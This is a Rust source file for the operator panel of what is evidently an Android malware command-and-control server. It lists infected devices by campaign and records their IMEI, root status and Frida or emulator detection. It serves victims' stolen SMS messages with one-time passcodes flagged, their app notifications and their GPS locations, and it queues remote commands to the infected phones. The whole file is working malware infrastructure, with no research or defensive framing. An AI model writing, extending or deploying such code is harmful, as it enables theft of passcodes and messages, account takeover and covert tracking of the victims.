use anyhow::Result;
use serde::{Deserialize, Serialize};
use sqlx::PgPool;
use std::sync::Arc;
use tracing::{error, info};
use warp::Filter;

// ============================================================================
// API TYPES
// ============================================================================

#[derive(Debug, Serialize, Deserialize)]
pub struct LoginRequest {
    pub username: String,
    pub password: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct LoginResponse {
    pub token: String,
    pub operator_id: String,
    pub username: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct DeviceListItem {
    pub device_id: String,
    pub fingerprint: String,
    pub campaign_id: String,
    pub os_version: i32,
    pub manufacturer: String,
    pub model: String,
    pub last_seen: String,
    pub is_active: bool,
    pub data_exfilled_mb: f64,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct DeviceDetail {
    pub device_id: String,
    pub fingerprint: String,
    pub campaign_id: String,
    pub first_seen: String,
    pub last_seen: String,
    pub os_version: i32,
    pub manufacturer: String,
    pub model: String,
    pub rooted: bool,
    pub frida_detected: bool,
    pub emulator: bool,
    pub country_code: Option<String>,
    pub imei: Option<String>,
    pub data_exfilled_mb: f64,
    pub commands_executed: i32,
    pub pending_commands: i64,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SendCommandRequest {
    pub device_id: String,
    pub command_type: String,
    pub priority: i32,
    pub payload: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SendCommandResponse {
    pub command_id: String,
    pub status: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SmsData {
    pub sms_id: String,
    pub phone_number: Option<String>,
    pub body: Option<String>,
    pub is_otp: bool,
    pub timestamp: Option<String>,
    pub received_at: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct NotificationData {
    pub notif_id: String,
    pub app_package: String,
    pub title: Option<String>,
    pub body: Option<String>,
    pub timestamp: Option<String>,
    pub received_at: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct LocationData {
    pub location_id: String,
    pub latitude: f64,
    pub longitude: f64,
    pub accuracy: f64,
    pub timestamp: Option<String>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct DashboardStats {
    pub total_devices: i64,
    pub active_devices: i64,
    pub campaigns: i64,
    pub total_data_mb: f64,
    pub sms_count: i64,
    pub notification_count: i64,
    pub command_count: i64,
}

// ============================================================================
// PANEL SERVER
// ============================================================================

pub struct PanelServer {
    db: PgPool,
    secret_key: String,
}

impl PanelServer {
    pub fn new(db: PgPool, secret_key: String) -> Self {
        Self { db, secret_key }
    }

    pub async fn list_devices(&self, campaign_id: &str) -> Result<Vec<DeviceListItem>> {
        let devices = sqlx::query_as::<_, (String, String, String, i32, String, String, String, bool, f64)>(
            r#"
            SELECT device_id, fingerprint, campaign_id, os_version,
                   manufacturer, model, last_seen, is_active, data_exfilled_mb
            FROM devices
            WHERE campaign_id = $1
            ORDER BY last_seen DESC
            "#
        )
        .bind(campaign_id)
        .fetch_all(&self.db)
        .await?;

        let result = devices
            .into_iter()
            .map(|(device_id, fingerprint, campaign_id, os_version, manufacturer, model, last_seen, is_active, data_exfilled_mb)| {
                DeviceListItem {
                    device_id,
                    fingerprint,
                    campaign_id,
                    os_version,
                    manufacturer,
                    model,
                    last_seen,
                    is_active,
                    data_exfilled_mb,
                }
            })
            .collect();

        Ok(result)
    }

    pub async fn get_device_detail(&self, device_id: &str) -> Result<Option<DeviceDetail>> {
        type DeviceRow = (String, String, String, String, String, i32, String, String, bool, bool, bool, Option<String>, Option<String>, f64, i32);
        let device = sqlx::query_as::<_, DeviceRow>(
            r#"
            SELECT device_id, fingerprint, campaign_id, first_seen, last_seen,
                   os_version, manufacturer, model, rooted, frida_detected, emulator,
                   country_code, imei, data_exfilled_mb, commands_executed
            FROM devices
            WHERE device_id = $1
            "#
        )
        .bind(device_id)
        .fetch_optional(&self.db)
        .await?;

        if let Some((device_id, fingerprint, campaign_id, first_seen, last_seen, os_version,
                    manufacturer, model, rooted, frida_detected, emulator, country_code,
                    imei, data_exfilled_mb, commands_executed)) = device {

            let pending_commands: i64 = sqlx::query_scalar(
                "SELECT COUNT(*) FROM commands WHERE device_id = $1 AND status = 'pending'"
            )
            .bind(device_id.clone())
            .fetch_one(&self.db)
            .await?;

            Ok(Some(DeviceDetail {
                device_id,
                fingerprint,
                campaign_id,
                first_seen,
                last_seen,
                os_version,
                manufacturer,
                model,
                rooted,
                frida_detected,
                emulator,
                country_code,
                imei,
                data_exfilled_mb,
                commands_executed,
                pending_commands,
            }))
        } else {
            Ok(None)
        }
    }

    pub async fn send_command(&self, req: SendCommandRequest) -> Result<SendCommandResponse> {
        let command_id = uuid::Uuid::new_v4().to_string();
        let now = chrono::Utc::now();
        let payload = req.payload.as_deref().map(|p| p.as_bytes().to_vec());

        sqlx::query(
            r#"
            INSERT INTO commands (
                command_id, device_id, command_type, priority,
                payload, status, created_at
            )
            VALUES ($1, $2, $3, $4, $5, 'pending', $6)
            "#
        )
        .bind(&command_id)
        .bind(&req.device_id)
        .bind(&req.command_type)
        .bind(req.priority)
        .bind(payload)
        .bind(&now)
        .execute(&self.db)
        .await?;

        info!("Command queued: command_id={}, device_id={}, type={}",
              command_id, req.device_id, req.command_type);

        Ok(SendCommandResponse {
            command_id,
            status: "queued".to_string(),
        })
    }

    pub async fn get_device_commands(&self, device_id: &str) -> Result<Vec<serde_json::Value>> {
        let commands = sqlx::query_as::<_, (String, String, String, i32, String, Option<String>)>(
            r#"
            SELECT command_id, command_type, status, priority, created_at, result
            FROM commands
            WHERE device_id = $1
            ORDER BY created_at DESC
            LIMIT 100
            "#
        )
        .bind(device_id)
        .fetch_all(&self.db)
        .await?;

        let result = commands
            .into_iter()
            .map(|(command_id, command_type, status, priority, created_at, result)| {
                serde_json::json!({
                    "command_id": command_id,
                    "command_type": command_type,
                    "status": status,
                    "priority": priority,
                    "created_at": created_at,
                    "result": result,
                })
            })
            .collect();

        Ok(result)
    }

    pub async fn get_device_sms(&self, device_id: &str, limit: i32) -> Result<Vec<SmsData>> {
        let sms = sqlx::query_as::<_, (String, Option<String>, Option<String>, bool, Option<String>, String)>(
            r#"
            SELECT sms_id, phone_number, body, is_otp, timestamp, received_at
            FROM exfil_sms
            WHERE device_id = $1
            ORDER BY received_at DESC
            LIMIT $2
            "#
        )
        .bind(device_id)
        .bind(limit)
        .fetch_all(&self.db)
        .await?;

        let result = sms
            .into_iter()
            .map(|(sms_id, phone_number, body, is_otp, timestamp, received_at)| {
                SmsData { sms_id, phone_number, body, is_otp, timestamp, received_at }
            })
            .collect();

        Ok(result)
    }

    pub async fn get_device_notifications(&self, device_id: &str, limit: i32) -> Result<Vec<NotificationData>> {
        let notifs = sqlx::query_as::<_, (String, String, Option<String>, Option<String>, Option<String>, String)>(
            r#"
            SELECT notif_id, app_package, title, body, timestamp, received_at
            FROM exfil_notifications
            WHERE device_id = $1
            ORDER BY received_at DESC
            LIMIT $2
            "#
        )
        .bind(device_id)
        .bind(limit)
        .fetch_all(&self.db)
        .await?;

        let result = notifs
            .into_iter()
            .map(|(notif_id, app_package, title, body, timestamp, received_at)| {
                NotificationData { notif_id, app_package, title, body, timestamp, received_at }
            })
            .collect();

        Ok(result)
    }

    pub async fn get_device_locations(&self, device_id: &str, limit: i32) -> Result<Vec<LocationData>> {
        let locations = sqlx::query_as::<_, (String, f64, f64, f64, Option<String>)>(
            r#"
            SELECT location_id, latitude, longitude, accuracy, timestamp
            FROM exfil_locations
            WHERE device_id = $1
            ORDER BY timestamp DESC
            LIMIT $2
            "#
        )
        .bind(device_id)
        .bind(limit)
        .fetch_all(&self.db)
        .await?;

        let result = locations
            .into_iter()
            .map(|(location_id, latitude, longitude, accuracy, timestamp)| {
                LocationData { location_id, latitude, longitude, accuracy, timestamp }
            })
            .collect();

        Ok(result)
    }

    pub async fn get_dashboard_stats(&self, campaign_id: &str) -> Result<DashboardStats> {
        let total_devices: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM devices WHERE campaign_id = $1"
        )
        .bind(campaign_id)
        .fetch_one(&self.db)
        .await?;

        let active_devices: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM devices WHERE campaign_id = $1 AND is_active = TRUE"
        )
        .bind(campaign_id)
        .fetch_one(&self.db)
        .await?;

        let campaigns: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM campaigns WHERE is_active = TRUE"
        )
        .fetch_one(&self.db)
        .await?;

        let total_data_mb: f64 = sqlx::query_scalar(
            "SELECT COALESCE(SUM(data_exfilled_mb), 0) FROM devices WHERE campaign_id = $1"
        )
        .bind(campaign_id)
        .fetch_one(&self.db)
        .await?;

        let sms_count: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM exfil_sms WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = $1)"
        )
        .bind(campaign_id)
        .fetch_one(&self.db)
        .await?;

        let notification_count: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM exfil_notifications WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = $1)"
        )
        .bind(campaign_id)
        .fetch_one(&self.db)
        .await?;

        let command_count: i64 = sqlx::query_scalar(
            "SELECT COUNT(*) FROM commands WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = $1)"
        )
        .bind(campaign_id)
        .fetch_one(&self.db)
        .await?;

        Ok(DashboardStats {
            total_devices,
            active_devices,
            campaigns,
            total_data_mb,
            sms_count,
            notification_count,
            command_count,
        })
    }
}

// ============================================================================
// HTTP ROUTES
// ============================================================================

pub async fn start_panel_server(server: Arc<PanelServer>, addr: std::net::SocketAddr) -> Result<()> {
    let list_devices = {
        let server = server.clone();
        warp::path!("api" / "devices" / String)
            .and(warp::get())
            .and_then(move |campaign_id: String| {
                let server = server.clone();
                async move {
                    match server.list_devices(&campaign_id).await {
                        Ok(devices) => Ok::<_, warp::Rejection>(warp::reply::json(&devices)),
                        Err(e) => {
                            error!("List devices error: {}", e);
                            Err(warp::reject::reject())
                        }
                    }
                }
            })
    };

    let get_device = {
        let server = server.clone();
        warp::path!("api" / "device" / String)
            .and(warp::get())
            .and_then(move |device_id: String| {
                let server = server.clone();
                async move {
                    match server.get_device_detail(&device_id).await {
                        Ok(Some(device)) => Ok::<_, warp::Rejection>(warp::reply::json(&device)),
                        Ok(None) => Err(warp::reject::not_found()),
                        Err(e) => {
                            error!("Get device error: {}", e);
                            Err(warp::reject::reject())
                        }
                    }
                }
            })
    };

    let send_command = {
        let server = server.clone();
        warp::path!("api" / "command")
            .and(warp::post())
            .and(warp::body::json())
            .and_then(move |req: SendCommandRequest| {
                let server = server.clone();
                async move {
                    match server.send_command(req).await {
                        Ok(resp) => Ok::<_, warp::Rejection>(warp::reply::json(&resp)),
                        Err(e) => {
                            error!("Send command error: {}", e);
                            Err(warp::reject::reject())
                        }
                    }
                }
            })
    };

    let dashboard = {
        let server = server.clone();
        warp::path!("api" / "dashboard" / String)
            .and(warp::get())
            .and_then(move |campaign_id: String| {
                let server = server.clone();
                async move {
                    match server.get_dashboard_stats(&campaign_id).await {
                        Ok(stats) => Ok::<_, warp::Rejection>(warp::reply::json(&stats)),
                        Err(e) => {
                            error!("Dashboard error: {}", e);
                            Err(warp::reject::reject())
                        }
                    }
                }
            })
    };

    let routes = list_devices
        .or(get_device)
        .or(send_command)
        .or(dashboard);

    info!("Panel server starting on {}", addr);
    let (_, server_future) = warp::serve(routes)
        .bind_with_graceful_shutdown(addr, async {
            tokio::signal::ctrl_c().await.ok();
        });
    server_future.await;

    Ok(())
}
